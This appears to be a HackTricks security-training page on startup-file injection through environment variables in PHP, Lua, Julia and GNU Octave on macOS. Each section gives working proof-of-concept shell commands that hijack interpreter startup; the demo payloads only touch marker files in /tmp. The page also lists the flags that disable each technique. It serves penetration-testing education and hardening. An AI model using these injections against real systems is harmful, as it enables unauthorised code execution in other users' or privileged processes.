# macOS Interpreter Startup-File Injection

{{#include ../../../banners/hacktricks-training.md}}

These runtime-specific techniques use inherited environment variables to select startup configuration or code before the intended script. Lua also supports an inline-code variant.

## PHP startup configuration

### `PHPRC` / `PHP_INI_SCAN_DIR` and `auto_prepend_file`

PHP CLI and CGI read configuration on every invocation. `PHPRC` can select an attacker-readable `php.ini`, while `PHP_INI_SCAN_DIR` can redirect the directory scanned for additional `.ini` files. The `auto_prepend_file` directive makes PHP parse a file before the requested script, so this combination becomes startup code execution.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

An alternative is a directory containing an `.ini` file:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

The `-n` option ignores `php.ini`; an explicit trusted `-c` path takes precedence over `PHPRC`. Remember that a long-lived server SAPI normally reads configuration when the web server starts, whereas CLI and CGI do so per invocation.<sup>[[1]](#references)</sup>

## Lua startup code

### `LUA_INIT`

Before processing command-line options or the target script, the standalone Lua interpreter executes `LUA_INIT_<major>_<minor>` or, if the versioned variable is absent, `LUA_INIT`. A value beginning with `@` names a file; any other value is evaluated directly as Lua code. This gives both file-backed and fileless startup execution.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

The exact versioned name changes with the interpreter, for example `LUA_INIT_5_4`. `lua -E` ignores all environment variables, including startup code and Lua module paths.

## Julia startup depot

### `JULIA_DEPOT_PATH` and `startup.jl`

Julia normally executes `config/startup.jl` from its first depot at startup. `JULIA_DEPOT_PATH` controls the depot list, so pointing it to an attacker-readable tree redirects the automatically loaded startup file.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

The trailing separator is useful when the victim still needs its normal packages. `julia --startup-file=no` disables this startup file. Clear the variable before launch because it also controls package registries, environments, caches, and code-loading locations.

## GNU Octave startup files

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave executes several files containing valid Octave commands during startup. `OCTAVE_SITE_INITFILE` overrides the site-wide startup file and `OCTAVE_VERSION_INITFILE` overrides the version-specific one, allowing either variable to redirect automatic execution to an attacker-readable file.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` only skips user files such as `~/.octaverc`; it does **not** stop the site-file override above. Use `--no-site-file` for the site files or `--norc` / `-f` to disable all startup files.<sup>[[7]](#references)</sup>

## References

- [1] [PHP configuration file](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Lua 5.4 standalone interpreter](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Julia command-line interface: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [GNU Octave Startup Files](https://docs.octave.org/latest/Startup-Files.html)
- [7] [GNU Octave Command Line Options](https://docs.octave.org/latest/Command-Line-Options.html)

{{#include ../../../banners/hacktricks-training.md}}
